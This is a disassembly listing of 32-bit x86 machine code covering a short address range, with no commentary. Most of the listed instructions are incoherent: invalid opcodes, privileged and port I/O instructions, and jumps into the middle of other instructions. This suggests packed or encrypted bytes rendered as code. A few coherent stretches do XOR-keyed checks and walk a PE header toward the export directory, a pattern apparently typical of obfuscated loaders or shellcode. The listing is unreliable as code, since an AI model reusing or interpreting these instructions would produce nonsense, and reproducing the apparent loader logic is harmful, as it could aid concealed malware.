  40bd42:	rol    DWORD PTR [ebx],0x87
  40bd45:	pusha  
  40bd46:	ins    DWORD PTR es:[edi],dx
  40bd47:	jmp    DWORD PTR [ebp+edx*8-0x5c]
  40bd4b:	fidivr DWORD PTR [esi+0x3391835d]
  40bd51:	sub    al,0x2d
  40bd53:	xor    ebp,DWORD PTR [edi+0x4e]
  40bd56:	(bad)  
  40bd57:	in     eax,0x1e
  40bd59:	ret    
  40bd5a:	xor    bh,BYTE PTR [edx+0x1e]
  40bd5d:	adc    al,0x79
  40bd5f:	xchg   DWORD PTR [ebx+0x56],edx
  40bd62:	sub    dh,dl
  40bd64:	xor    BYTE PTR [edx-0x14],dl
  40bd67:	adc    bl,BYTE PTR [eax]
  40bd69:	mov    ebp,ebp
  40bd6b:	leave  
  40bd6c:	push   ecx
  40bd6d:	push   0xffffffd9
  40bd6f:	add    esi,DWORD PTR [ebx+0x330c4d8b]
  40bd75:	mov    BYTE PTR [ebx],0xc0
  40bd78:	xor    ecx,esi
  40bd7a:	jmp    0x40c0c7
  40bd7f:	push   DWORD PTR [ebx-0xe4f1304]
  40bd85:	outs   dx,DWORD PTR ds:[esi]
  40bd86:	jno    0x40bd30
  40bd88:	mov    dh,0x9c
  40bd8a:	repnz sbb al,0x36
  40bd8d:	fbld   TBYTE PTR [ecx-0x47]
  40bd90:	cld    
  40bd91:	jle    0x40be11
  40bd93:	cs jge 0x40be14
  40bd96:	jle    0x40bdfa
  40bd98:	imul   esp,DWORD PTR [esi+0x77],0xffffff94
  40bd9c:	add    al,0x5c
  40bd9e:	adc    DWORD PTR ds:0x8e62b3e4,esp
  40bda4:	call   0x74d5:0x49762b68
  40bdab:	pop    es
  40bdac:	sbb    esi,ecx
  40bdae:	dec    esi
  40bdaf:	sbb    al,0xb
  40bdb1:	sub    dl,BYTE PTR [eax-0x42]
  40bdb4:	fisubr WORD PTR [edi-0x4e9b59]
  40bdba:	dec    BYTE PTR [ebx+ecx*2]
  40bdbd:	out    dx,al
  40bdbe:	fist   DWORD PTR [ecx-0x112697c9]
  40bdc4:	imul   esi,DWORD PTR [ebp-0x21],0x4ca3074d
  40bdcb:	fcom   QWORD PTR [edx]
  40bdcd:	add    al,0xb4
  40bdcf:	mov    dh,0xeb
  40bdd1:	mov    ah,BYTE PTR [esi+0x42aa09ca]
  40bdd7:	mov    ecx,0xea4aaf0f
  40bddc:	xchg   esp,eax
  40bddd:	pop    esi
  40bdde:	pop    ebx
  40bddf:	adc    esi,edx
  40bde1:	loopne 0x40bd7c
  40bde3:	or     al,0xf2
  40bde5:	cmp    eax,0x1ac1fe94
  40bdea:	out    0xff,al
  40bdec:	sbb    esi,DWORD PTR [ebp+0x60]
  40bdef:	pop    ecx
  40bdf0:	or     DWORD PTR [ebx-0x767e2625],esi
  40bdf6:	pop    edi
  40bdf7:	pop    ebp
  40bdf8:	and    al,0x33
  40bdfa:	enter  0x6dc6,0x43
  40bdfe:	xor    BYTE PTR [ebx+0x13ad0199],0xfc
  40be05:	cmp    cl,BYTE PTR [ebx]
  40be07:	mov    fs,WORD PTR [edx]
  40be09:	repnz mov edx,0x13d06c15
  40be0f:	add    esp,ebp
  40be11:	rsm    
  40be13:	hlt    
  40be14:	loope  0x40be7d
  40be16:	adc    al,0x2c
  40be18:	sub    BYTE PTR [eax+0x7e],0xd9
  40be1c:	popa   
  40be1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be1e:	test   BYTE PTR [edx-0x62724c9a],al
  40be24:	loop   0x40bde8
  40be26:	not    BYTE PTR [eax]
  40be28:	jg     0x40be47
  40be2a:	push   edi
  40be2b:	mov    bl,0x3b
  40be2d:	or     ecx,DWORD PTR [ecx+0xe]
  40be30:	repz jbe 0x40bdcd
  40be33:	jns    0x40bdd9
  40be35:	aam    0x68
  40be37:	jnp    0x40bdc4
  40be39:	or     BYTE PTR [edi-0x7902f1ed],0x83
  40be40:	xchg   esp,eax
  40be41:	dec    edx
  40be42:	enter  0xfb1c,0x6a
  40be46:	push   DWORD PTR [ebp+ebp*2-0x1846cad]
  40be4d:	scas   al,BYTE PTR es:[edi]
  40be4e:	xor    ah,0xae
  40be51:	mov    ebp,0x7a3d7316
  40be56:	jo     0x40be9f
  40be58:	mul    BYTE PTR [esi+0x47]
  40be5b:	or     al,0xf2
  40be5d:	sbb    al,0x43
  40be5f:	and    bh,ch
  40be61:	adc    ebp,DWORD PTR [ebp+0x7]
  40be64:	das    
  40be65:	xchg   ebx,eax
  40be66:	jl     0x40be11
  40be68:	ret    0xb18a
  40be6b:	adc    DWORD PTR [edi-0x17c8fa33],eax
  40be71:	mov    ebp,0xe0ac8152
  40be76:	iret   
  40be77:	mov    eax,0xe66dbcb3
  40be7c:	popf   
  40be7d:	xchg   DWORD PTR [ebx],eax
  40be7f:	call   0x53dc2aaf
  40be84:	addr16 out 0x30,al
  40be87:	aas    
  40be88:	dec    esp
  40be89:	fsub   DWORD PTR [edx]
  40be8b:	out    dx,al
  40be8c:	and    DWORD PTR [ecx],0x29
  40be8f:	cmp    eax,0x7077428b
  40be94:	push   0x9c1869e8
  40be99:	mov    eax,DWORD PTR [edi+0x6a]
  40be9c:	add    DWORD PTR [ebx+0x649d5299],edi
  40bea2:	test   eax,edx
  40bea4:	in     al,dx
  40bea5:	xor    cl,BYTE PTR [ecx]
  40bea7:	mov    ebx,edx
  40bea9:	jo     0x40be89
  40beab:	xchg   DWORD PTR [ebp-0x23ed19da],edx
  40beb1:	cli    
  40beb2:	sbb    DWORD PTR [esi+0x79],ebp
  40beb5:	sub    al,0xad
  40beb7:	cld    
  40beb8:	test   BYTE PTR [edx+0x5e],ah
  40bebb:	fisttp DWORD PTR [edi]
  40bebd:	lods   eax,DWORD PTR gs:[esi]
  40bebf:	aaa    
  40bec0:	sar    cl,1
  40bec2:	jg     0x40be7b
  40bec4:	xor    al,0x1f
  40bec6:	arpl   WORD PTR [esi],bp
  40bec8:	jp     0x40be7b
  40beca:	xchg   edx,eax
  40becb:	iret   
  40becc:	cwde   
  40becd:	retf   0xb752
  40bed0:	shl    ebx,cl
  40bed2:	or     al,al
  40bed4:	mov    ebp,0xb7c475d3
  40bed9:	fdiv   DWORD PTR [esi-0x53]
  40bedc:	adc    al,0x3b
  40bede:	adc    DWORD PTR [eax+0x4a],ebx
  40bee1:	or     al,0xbb
  40bee3:	cwde   
  40bee4:	dec    ebp
  40bee5:	adc    DWORD PTR [edx-0x2240d8db],edi
  40beeb:	lods   eax,DWORD PTR ds:[esi]
  40beec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40beed:	popa   
  40beee:	cmp    al,0xcc
  40bef0:	daa    
  40bef1:	xchg   bh,ah
  40bef3:	xchg   cx,ax
  40bef5:	sub    DWORD PTR [edi+esi*8-0x9],edx
  40bef9:	mov    dh,0x79
  40befb:	popa   
  40befc:	ins    BYTE PTR es:[edi],dx
  40befd:	xor    DWORD PTR [edx+0x5fbce9e1],eax
  40bf03:	push   0x92ac3e67
  40bf08:	add    ch,BYTE PTR [ebx-0x71252778]
  40bf0e:	js     0x40bed2
  40bf10:	shl    BYTE PTR [ecx+0x51267ae7],cl
  40bf16:	retf   
  40bf17:	sub    dh,BYTE PTR [esi]
  40bf19:	push   0x6b3787df
  40bf1e:	xor    al,0x8b
  40bf20:	pop    ss
  40bf21:	out    0xbb,al
  40bf23:	adc    ah,BYTE PTR [ecx+ecx*2+0x76b3c381]
  40bf2a:	dec    BYTE PTR ds:0x8bc976f
  40bf30:	and    edi,DWORD PTR [esi-0x1e8f2c27]
  40bf36:	fstp   DWORD PTR [ecx-0x37642a5c]
  40bf3c:	and    eax,0xe5cda90f
  40bf41:	pop    eax
  40bf42:	adc    eax,0x57ddcac8
  40bf47:	xchg   ebx,eax
  40bf48:	xchg   ebx,eax
  40bf49:	sub    cl,bh
  40bf4b:	outs   dx,BYTE PTR ds:[esi]
  40bf4c:	(bad)  
  40bf4d:	clc    
  40bf4e:	sbb    DWORD PTR [edx],ebx
  40bf50:	push   esi
  40bf51:	mov    al,0xdd
  40bf53:	jmp    0xbb19:0x7f1b062
  40bf5a:	sub    ebx,DWORD PTR [ecx]
  40bf5c:	aaa    
  40bf5d:	xor    dl,BYTE PTR [ebp-0x664d7997]
  40bf63:	mov    bh,0x53
  40bf65:	jb     0x40bef5
  40bf67:	mov    eax,ds:0xffa938fb
  40bf6c:	in     eax,dx
  40bf6d:	mov    ?,edx
  40bf6f:	push   0x786eeb5
  40bf74:	int3   
  40bf75:	enter  0xb5d2,0x40
  40bf79:	pop    ebp
  40bf7a:	mov    edx,0xd6362113
  40bf7f:	mov    ds:0x505a1cfb,eax
  40bf84:	sahf   
  40bf85:	inc    eax
  40bf86:	aad    0x1c
  40bf88:	jmp    0x7b1145a2
  40bf8d:	dec    edi
  40bf8e:	cmp    eax,DWORD PTR [eax]
  40bf90:	jbe    0x40bff5
  40bf92:	push   ebx
  40bf93:	and    DWORD PTR [esp+ebx*2-0x5d3c0788],edx
  40bf9a:	pop    ds
  40bf9b:	inc    esi
  40bf9c:	out    dx,eax
  40bf9d:	loopne 0x40bf8f
  40bf9f:	mov    al,0x77
  40bfa1:	mov    dh,0x17
  40bfa3:	scas   eax,DWORD PTR es:[edi]
  40bfa4:	in     al,0xf6
  40bfa6:	xchg   edi,eax
  40bfa7:	das    
  40bfa8:	mul    DWORD PTR [ebp+esi*2+0x2c]
  40bfac:	and    BYTE PTR [ecx-0x6d57c1c5],ah
  40bfb2:	xchg   edx,eax
  40bfb3:	nop
  40bfb4:	jb     0x40bf9a
  40bfb6:	adc    ah,dl
  40bfb8:	aam    0xd4
  40bfba:	pop    esi
  40bfbb:	es cmp cl,ch
  40bfbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfbf:	fbstp  TBYTE PTR [edi-0x23]
  40bfc2:	shr    esi,0xd5
  40bfc5:	dec    esp
  40bfc6:	jge    0x40c040
  40bfc8:	sub    ch,BYTE PTR [eax+0x1b]
  40bfcb:	push   ebp
  40bfcc:	jl     0x40bf84
  40bfce:	rol    eax,1
  40bfd0:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bfd2:	pop    ecx
  40bfd3:	mov    ecx,0xd11b5478
  40bfd8:	shl    DWORD PTR [ebx-0x2b],cl
  40bfdb:	mov    eax,0xbbe61097
  40bfe0:	and    eax,0xb1873537
  40bfe5:	popf   
  40bfe6:	les    esp,FWORD PTR [esi-0x56]
  40bfe9:	sub    edi,DWORD PTR [edx-0x11]
  40bfec:	mov    ebx,0xc4dc81bb
  40bff1:	push   ebp
  40bff2:	inc    ebp
  40bff3:	aam    0x29
  40bff5:	test   DWORD PTR ds:0x74ee355e,ebp
  40bffb:	fistp  DWORD PTR [ebp+0x4]
  40bffe:	inc    esp
  40bfff:	pop    ecx
  40c000:	push   0x34f328c2
  40c005:	push   ds
  40c006:	hlt    
  40c007:	lea    edi,[ebp+0x37562f83]
  40c00d:	je     0x40c048
  40c00f:	inc    ecx
  40c010:	cmp    al,0xbe
  40c012:	fidiv  WORD PTR [esi]
  40c014:	jno    0x40c033
  40c016:	test   al,0x4d
  40c018:	iret   
  40c019:	mov    ebx,0x22323d7d
  40c01e:	lods   al,BYTE PTR ds:[esi]
  40c01f:	jmp    0x40bfe5
  40c021:	xchg   edi,eax
  40c022:	jg     0x40bffa
  40c024:	or     DWORD PTR [ebp+0xc],edx
  40c027:	mov    esp,0x5e186c21
  40c02c:	xor    bh,ah
  40c02e:	xor    BYTE PTR [ecx+0x1ce7f61b],dl
  40c034:	mul    DWORD PTR [ebp-0x6]
  40c037:	push   ss
  40c038:	(bad)  
  40c039:	ja     0x40bff4
  40c03b:	lock retf 
  40c03d:	mov    eax,ds:0x4ced5717
  40c042:	repnz lahf 
  40c044:	adc    al,BYTE PTR [esi+0x73]
  40c047:	and    BYTE PTR [ecx-0x5f3c8d67],ah
  40c04d:	mov    eax,0xfc41df67
  40c052:	outs   dx,DWORD PTR ds:[esi]
  40c053:	cs out dx,al
  40c055:	and    DWORD PTR [edx],esp
  40c057:	in     eax,dx
  40c058:	mov    ch,0x7c
  40c05a:	or     eax,0xca972777
  40c05f:	mov    edi,0x2fc6a705
  40c064:	ret    
  40c065:	(bad)
  40c06a:	aam    0xcd
  40c06c:	addr16 xchg ecx,eax
  40c06e:	test   BYTE PTR [edx+0x52ac9b9f],bh
  40c074:	cvttps2pi mm4,QWORD PTR [ecx+0x7b]
  40c078:	mov    al,ds:0x834acf57
  40c07d:	sahf   
  40c07e:	inc    esp
  40c07f:	sub    esi,ecx
  40c081:	cmp    edx,DWORD PTR [ecx+0x2f]
  40c084:	jno    0x40c0a4
  40c086:	scas   al,BYTE PTR es:[edi]
  40c087:	pop    es
  40c088:	std    
  40c089:	test   eax,0xd8890ffd
  40c08e:	mov    ebp,DWORD PTR [edi-0x36]
  40c091:	cmp    bh,BYTE PTR [ecx+eax*4-0x3f57297c]
  40c098:	imul   esi,DWORD PTR [ebp+0xcb5eb3b],0xffffffd2
  40c09f:	cmp    BYTE PTR [ebx],ah
  40c0a1:	clc    
  40c0a2:	push   cs
  40c0a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c0a4:	and    DWORD PTR [esi-0x50d0338c],esi
  40c0aa:	std    
  40c0ab:	hlt    
  40c0ac:	jnp    0x40c05d
  40c0ae:	sbb    ch,BYTE PTR [esi+0x5c8238cf]
  40c0b4:	into   
  40c0b5:	mov    ebx,0xaed99ed4
  40c0ba:	shl    esp,cl
  40c0bc:	ret    0x37d6
  40c0bf:	call   0xebfe:0xb691ec7f
  40c0c6:	lds    ebp,FWORD PTR [ebx]
  40c0c8:	enter  0x8b66,0x45
  40c0cc:	cld    
  40c0cd:	movzx  eax,ax
  40c0d0:	sub    ecx,edi
  40c0d2:	cmp    eax,ecx
  40c0d4:	mov    eax,DWORD PTR [ebp-0x14]
  40c0d7:	movzx  ecx,WORD PTR [ebp-0x4]
  40c0db:	jg     0x40c0f0
  40c0e1:	xor    eax,esi
  40c0e3:	sub    ecx,eax
  40c0e5:	sub    ecx,edi
  40c0e7:	mov    WORD PTR [ebp-0x4],cx
  40c0eb:	jmp    0x40c44a
  40c0f0:	xor    eax,esi
  40c0f2:	jmp    0x40c43f
  40c0f7:	nop
  40c0f8:	push   esp
  40c0f9:	in     al,dx
  40c0fa:	shr    eax,1
  40c0fc:	jno    0x40c0af
  40c0fe:	push   ebp
  40c0ff:	mov    ss,WORD PTR [ecx+esi*8+0x70]
  40c103:	mov    dh,BYTE PTR [edx+0x69]
  40c106:	fsubr  DWORD PTR [ecx-0x5]
  40c109:	jle    0x40c189
  40c10b:	cs jge 0x40c18c
  40c10e:	jle    0x40c112
  40c110:	sbb    eax,0x8f700d0e
  40c115:	fstp   TBYTE PTR [edi]
  40c117:	es gs and eax,0xf14dc74b
  40c11e:	es inc esi
  40c120:	lahf   
  40c121:	and    al,ah
  40c123:	scas   al,BYTE PTR es:[edi]
  40c124:	push   esp
  40c125:	xchg   BYTE PTR [edi],bh
  40c127:	xor    ebx,edi
  40c129:	xchg   ebp,eax
  40c12a:	dec    BYTE PTR [ecx+0x6381d098]
  40c130:	retf   
  40c131:	in     al,dx
  40c132:	push   ds
  40c133:	pushf  
  40c134:	jae    0x40c169
  40c136:	mov    edx,0x579f737a
  40c13b:	sbb    ecx,DWORD PTR [eax+0xbeabe4f]
  40c141:	mov    eax,ds:0xda16da35
  40c146:	in     eax,0x6d
  40c148:	xlat   BYTE PTR ds:[ebx]
  40c149:	pop    ds
  40c14a:	(bad)  
  40c14b:	or     DWORD PTR [edx*1+0x62b30fcb],edi
  40c152:	shl    DWORD PTR [edi+0x22bb30ef],0xc2
  40c159:	out    0x56,eax
  40c15b:	aas    
  40c15c:	push   cs
  40c15d:	ins    DWORD PTR es:[edi],dx
  40c15e:	xbegin 0x99207e99
  40c164:	jne    0x40c125
  40c166:	loop   0x40c1cc
  40c168:	arpl   sp,sp
  40c16a:	adc    DWORD PTR [edx],eax
  40c16c:	dec    edx
  40c16d:	cmp    cl,dl
  40c16f:	add    dl,BYTE PTR [eax+0x38c90487]
  40c175:	daa    
  40c176:	test   al,0xfa
  40c178:	ss inc edi
  40c17a:	gs push es
  40c17c:	mov    ds:0x2850b96d,al
  40c181:	jns    0x40c1fc
  40c183:	jge    0x40c160
  40c185:	pop    edx
  40c186:	push   ebp
  40c187:	mov    ds:0xb5d28f37,al
  40c18c:	out    dx,al
  40c18d:	jg     0x40c1bc
  40c18f:	loope  0x40c181
  40c191:	xchg   ebp,eax
  40c192:	fstp   TBYTE PTR [ebp-0x16]
  40c195:	imul   ebp,DWORD PTR [edx-0x68],0xc33baf39
  40c19c:	pop    ds
  40c19d:	add    al,0x86
  40c19f:	jns    0x40c154
  40c1a1:	stos   BYTE PTR es:[edi],al
  40c1a2:	ds out 0x11,al
  40c1a5:	(bad)  
  40c1a6:	cmp    eax,0x6689eef2
  40c1ab:	cwde   
  40c1ac:	mov    edx,0x2bce1bc0
  40c1b1:	test   DWORD PTR [edi+0x195102a5],esp
  40c1b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1b8:	sbb    ebp,DWORD PTR [esi-0x7d8a3a17]
  40c1be:	jmp    FWORD PTR [ecx+0x50f0ffae]
  40c1c4:	push   0xffffffc2
  40c1c6:	mov    eax,esi
  40c1c8:	popf   
  40c1c9:	mov    eax,0x9c73f9e1
  40c1ce:	or     eax,0xb2a25bfd
  40c1d3:	pushf  
  40c1d4:	fmul   QWORD PTR ds:0xb00cfdcb
  40c1da:	and    ebp,DWORD PTR [edx]
  40c1dc:	pop    esi
  40c1dd:	mov    ebp,esi
  40c1df:	gs dec eax
  40c1e1:	out    dx,al
  40c1e2:	ins    BYTE PTR es:[edi],dx
  40c1e3:	shl    ecx,1
  40c1e5:	fiadd  DWORD PTR [esi-0x6479a9a0]
  40c1eb:	mov    edi,0x209ad257
  40c1f0:	lods   ax,WORD PTR ds:[esi]
  40c1f2:	pusha  
  40c1f3:	fadd   DWORD PTR [ebp-0x5cd3be94]
  40c1f9:	sub    eax,0x68c1e1f0
  40c1fe:	daa    
  40c1ff:	mov    dl,0xc7
  40c201:	push   0xffffffb9
  40c203:	adc    eax,0x81ea45ce
  40c208:	lahf   
  40c209:	dec    edi
  40c20a:	int3   
  40c20b:	jo     0x40c27d
  40c20d:	stc    
  40c20e:	in     eax,0xec
  40c210:	mov    al,0x6f
  40c212:	xchg   ebx,eax
  40c213:	dec    ecx
  40c214:	sbb    bh,al
  40c216:	or     DWORD PTR [edx+0x7b4b9beb],ecx
  40c21c:	xchg   esp,eax
  40c21d:	mov    BYTE PTR [edx],bl
  40c21f:	pop    eax
  40c220:	fadd   st,st(2)
  40c222:	and    DWORD PTR [ecx-0x34],ebx
  40c225:	pushf  
  40c226:	push   es
  40c227:	mov    bh,0x3e
  40c229:	add    al,0xac
  40c22b:	sub    al,0x86
  40c22d:	sub    BYTE PTR [edi-0x5cb89908],0x72
  40c234:	addr16 je 0x40c1e0
  40c237:	xor    al,0x68
  40c239:	test   BYTE PTR [eax+0x1aee9c1a],cl
  40c23f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c240:	mov    dl,0xa
  40c242:	sar    DWORD PTR [edi+ecx*8-0xd],0x49
  40c247:	sbb    BYTE PTR [ebx-0x1574b79d],bh
  40c24d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c24e:	cwde   
  40c24f:	push   ecx
  40c250:	(bad)  [ecx]
  40c252:	mov    es,esi
  40c254:	xor    al,BYTE PTR [esi-0x46]
  40c257:	mov    ch,BYTE PTR [ecx+eiz*1-0x758db084]
  40c25e:	fs repz and dh,bh
  40c262:	cwde   
  40c263:	adc    BYTE PTR [ebx],0x27
  40c266:	getsec 
  40c268:	mov    al,0x5f
  40c26a:	loop   0x40c26d
  40c26c:	rcr    edi,0x89
  40c26f:	inc    esi
  40c270:	adc    eax,edi
  40c272:	xchg   edi,eax
  40c273:	cmp    DWORD PTR [esi],0x25a36d35
  40c279:	sub    esi,edx
  40c27b:	jo     0x40c29c
  40c27d:	pop    esp
  40c27e:	loop   0x40c2f4
  40c280:	mov    ebp,0x993cbe67
  40c285:	popa   
  40c286:	pop    esi
  40c287:	sahf   
  40c288:	or     al,0xf9
  40c28a:	rcr    DWORD PTR [ebp-0x40684b97],0x8f
  40c291:	scas   al,BYTE PTR es:[edi]
  40c292:	jbe    0x40c310
  40c294:	ss inc ebx
  40c296:	lock enter 0xf629,0x54
  40c29b:	fcomp  DWORD PTR [esi-0x643ae1b8]
  40c2a1:	xchg   ebx,eax
  40c2a2:	xchg   edx,eax
  40c2a3:	pop    edi
  40c2a4:	test   esi,0x8c7bc6d1
  40c2aa:	jmp    0x97c9:0xa49df126
  40c2b1:	rol    DWORD PTR [ebx],cl
  40c2b3:	adc    BYTE PTR [ecx-0x230d9499],ch
  40c2b9:	xchg   ebx,eax
  40c2ba:	fisubr DWORD PTR [ebp+0x5aaabf6e]
  40c2c0:	inc    ecx
  40c2c1:	dec    edx
  40c2c2:	sahf   
  40c2c3:	inc    esp
  40c2c4:	clc    
  40c2c5:	sub    cl,BYTE PTR [edx-0x49]
  40c2c8:	cli    
  40c2c9:	out    dx,eax
  40c2ca:	jns    0x40c2a2
  40c2cc:	and    BYTE PTR [edi-0x22],bl
  40c2cf:	xchg   edi,eax
  40c2d0:	xchg   BYTE PTR [esi-0x6],dl
  40c2d3:	test   al,0x98
  40c2d5:	jno    0x40c2b7
  40c2d7:	fdiv   DWORD PTR [esi]
  40c2d9:	adc    BYTE PTR [eax+eax*8],ah
  40c2dc:	push   es
  40c2dd:	dec    edx
  40c2de:	imul   esi,eax,0x5479ba9
  40c2e4:	imul   ebx,DWORD PTR [edi-0x74f8d764],0x8775f6c6
  40c2ee:	push   ds
  40c2ef:	sahf   
  40c2f0:	adc    al,0x79
  40c2f2:	hlt    
  40c2f3:	sub    eax,0x777863ae
  40c2f8:	jecxz  0x40c2d7
  40c2fa:	sbb    BYTE PTR [ebx+ebx*4-0x3781b885],cl
  40c301:	dec    esi
  40c302:	(bad)  
  40c303:	fs mov bh,0xd2
  40c306:	cmp    ebx,DWORD PTR [ecx+0x89df557]
  40c30c:	neg    BYTE PTR [edx+0x20]
  40c30f:	mov    ah,0x94
  40c311:	mov    fs,WORD PTR [ecx-0x1954c93e]
  40c317:	cdq    
  40c318:	adc    eax,0x206f80fc
  40c31d:	lea    edi,[ebp-0x1b19e905]
  40c323:	push   ecx
  40c324:	sub    DWORD PTR [edx],eax
  40c326:	daa    
  40c327:	(bad)  
  40c328:	pusha  
  40c329:	jmp    0xdea8:0x67a6b5a5
  40c330:	and    DWORD PTR [edi-0x6e],ebx
  40c333:	mov    cl,dh
  40c335:	or     eax,0x67f51096
  40c33a:	icebp  
  40c33b:	jo     0x40c399
  40c33d:	pop    esp
  40c33e:	addr16 pop ecx
  40c340:	jl     0x40c35e
  40c342:	jb     0x40c38d
  40c344:	push   edx
  40c345:	sub    dh,BYTE PTR [edi+0x7c8a7e]
  40c34b:	in     al,0x89
  40c34d:	push   cs
  40c34e:	(bad)  
  40c34f:	add    BYTE PTR [ebx-0x68],bl
  40c352:	jp     0x40c3cd
  40c354:	xchg   esi,eax
  40c355:	mov    bl,0xd4
  40c357:	dec    ebp
  40c358:	fld    QWORD PTR [edx+0x34123ec3]
  40c35e:	imul   esp,DWORD PTR [esi],0xd1d9f032
  40c364:	and    eax,ebp
  40c366:	or     dh,0x86
  40c369:	outs   dx,BYTE PTR ds:[esi]
  40c36a:	enter  0xd180,0xaf
  40c36e:	mov    ds:0xef57ab1f,eax
  40c373:	xlat   BYTE PTR ds:[ebx]
  40c374:	fbld   TBYTE PTR [eax]
  40c376:	shl    BYTE PTR [edi+0xa],0xd7
  40c37a:	mov    bh,0x2a
  40c37c:	push   ebx
  40c37d:	push   eax
  40c37e:	loop   0x40c310
  40c380:	aas    
  40c381:	ja     0x40c305
  40c383:	nop
  40c384:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c385:	lds    ecx,FWORD PTR [ecx-0x2e]
  40c388:	stos   DWORD PTR es:[edi],eax
  40c389:	int    0xd3
  40c38b:	mov    ebx,0x19c919c6
  40c390:	mov    al,0xd2
  40c392:	cld    
  40c393:	sub    al,0xe8
  40c395:	xor    bh,BYTE PTR [edi]
  40c397:	call   0x7438:0xed7f1b7f
  40c39e:	ficomp DWORD PTR [eax+0x24]
  40c3a1:	shr    dl,0x6f
  40c3a4:	retf   0x5438
  40c3a7:	clc    
  40c3a8:	aas    
  40c3a9:	adc    DWORD PTR [edi],0xcff1abd7
  40c3af:	in     al,dx
  40c3b0:	loop   0x40c41f
  40c3b2:	popf   
  40c3b3:	push   0xcb460540
  40c3b8:	or     BYTE PTR [edi],0x3e
  40c3bb:	inc    edx
  40c3bc:	pop    ebp
  40c3bd:	jmp    0x4ef00ecc
  40c3c2:	in     al,dx
  40c3c3:	and    BYTE PTR [eax+0x4b4a2595],dl
  40c3c9:	dec    edi
  40c3ca:	pop    es
  40c3cb:	mov    edx,DWORD PTR [ebp+0x7c]
  40c3ce:	out    0x74,al
  40c3d0:	jae    0x40c3fe
  40c3d2:	lds    ebx,FWORD PTR [esi+0x4f]
  40c3d5:	mov    bh,0x29
  40c3d7:	es jl  0x40c3e8
  40c3da:	sti    
  40c3db:	dec    esi
  40c3dc:	mov    ch,0x4f
  40c3de:	jmp    0x40c444
  40c3e0:	mov    ss,esp
  40c3e2:	ja     0x40c41d
  40c3e4:	mov    ds:0x4a4f9ea5,al
  40c3e9:	cmp    eax,0xe4e1eeab
  40c3ee:	push   ds
  40c3ef:	cmp    ebx,DWORD PTR [ecx+0x7359c4c]
  40c3f5:	dec    esi
  40c3f6:	xor    ebp,DWORD PTR [esi-0x3f563763]
  40c3fc:	mov    bl,0xc2
  40c3fe:	adc    al,0xee
  40c400:	push   0x6682bbe2
  40c405:	cdq    
  40c406:	in     al,0xe1
  40c408:	jg     0x40c47a
  40c40a:	out    0xea,al
  40c40c:	and    ch,BYTE PTR [eax+0x32]
  40c40f:	jns    0x40c3e5
  40c411:	outs   dx,BYTE PTR ds:[esi]
  40c412:	cmp    ah,dl
  40c414:	push   esi
  40c415:	mov    esi,0x6b8dcab8
  40c41a:	jmp    0x60596dec
  40c41f:	mov    ah,0x6a
  40c421:	dec    esi
  40c422:	inc    ebp
  40c423:	cmp    eax,0xb8693172
  40c428:	lea    eax,[eax]
  40c42a:	shr    esp,0x1d
  40c42d:	mov    eax,0xdbbcaac5
  40c432:	inc    BYTE PTR [esi]
  40c434:	dec    eax
  40c435:	ss mov ebp,0xd0293934
  40c43b:	xor    edi,DWORD PTR [ebx+0x2c]
  40c43e:	sub    cl,BYTE PTR [ebp+0x729b0884]
  40c444:	xor    al,BYTE PTR [eax]
  40c446:	mov    WORD PTR [ebp-0x4],ax
  40c44a:	mov    eax,DWORD PTR [ebp-0xc]
  40c44d:	cmp    eax,ebx
  40c44f:	je     0x40c463
  40c455:	mov    eax,DWORD PTR [ebp-0x8]
  40c458:	mov    DWORD PTR [eax],0x60341e89
  40c45e:	jmp    0x40cba4
  40c463:	mov    eax,DWORD PTR [ebp+0x8]
  40c466:	mov    ecx,DWORD PTR [ebp-0x8]
  40c469:	xor    eax,esi
  40c46b:	add    eax,edi
  40c46d:	cmp    DWORD PTR [ecx],eax
  40c46f:	je     0x40cb8c
  40c475:	mov    ecx,DWORD PTR [ebp-0x18]
  40c478:	mov    eax,DWORD PTR [ebp-0x8]
  40c47b:	mov    eax,DWORD PTR [eax]
  40c47d:	mov    eax,DWORD PTR [eax+0x3c]
  40c480:	lea    ecx,[ecx*8+0x78]
  40c487:	add    eax,ecx
  40c489:	jmp    0x40c7d6
  40c48e:	ffree  st(2)
  40c490:	les    esp,FWORD PTR ds:0xc2dd21e1
  40c496:	xchg   ebp,eax
  40c497:	(bad)  
  40c498:	sub    edx,DWORD PTR [edi-0x10]
  40c49b:	jmp    0x875a2f64
  40c4a0:	jle    0x40c520
  40c4a2:	cs jge 0x40c523
  40c4a5:	jle    0x40c524
  40c4a7:	jns    0x40c4bc
  40c4a9:	push   edx
  40c4aa:	sub    DWORD PTR [esi-0x37],0xffffffc0
  40c4ae:	xchg   edx,eax
  40c4af:	loopne 0x40c4b2
  40c4b1:	xor    DWORD PTR [edx],ebx
  40c4b3:	into   
  40c4b4:	or     eax,0x4adc5a0f
  40c4b9:	cmc    
  40c4ba:	shl    BYTE PTR [ecx+0x28],cl
  40c4bd:	sub    cl,ch
  40c4bf:	mov    DWORD PTR [eax+eax*2+0x21c68e9d],edi
  40c4c6:	dec    edx
  40c4c7:	leave  
  40c4c8:	or     al,0x6a
  40c4ca:	add    eax,0x43b96239
  40c4cf:	and    DWORD PTR [eax+0x64ac100b],esi
  40c4d5:	sbb    al,0x20
  40c4d7:	xor    al,0xeb
  40c4d9:	test   BYTE PTR [edi-0x578f53c],ch
  40c4df:	pop    edi
  40c4e0:	retf   
  40c4e1:	cdq    
  40c4e2:	out    0x1a,al
  40c4e4:	sahf   
  40c4e5:	in     al,dx
  40c4e6:	or     ebx,edi
  40c4e8:	sbb    BYTE PTR [ebp-0x33],dl
  40c4eb:	in     eax,0xc7
  40c4ed:	xchg   BYTE PTR ds:0xbfa66b8,bl
  40c4f3:	or     eax,0xc525128e
  40c4f8:	ja     0x40c50d
  40c4fa:	leave  
  40c4fb:	mov    bh,0x3c
  40c4fd:	dec    eax
  40c4fe:	lea    esp,[eax]
  40c500:	jns    0x40c576
  40c502:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c503:	push   eax
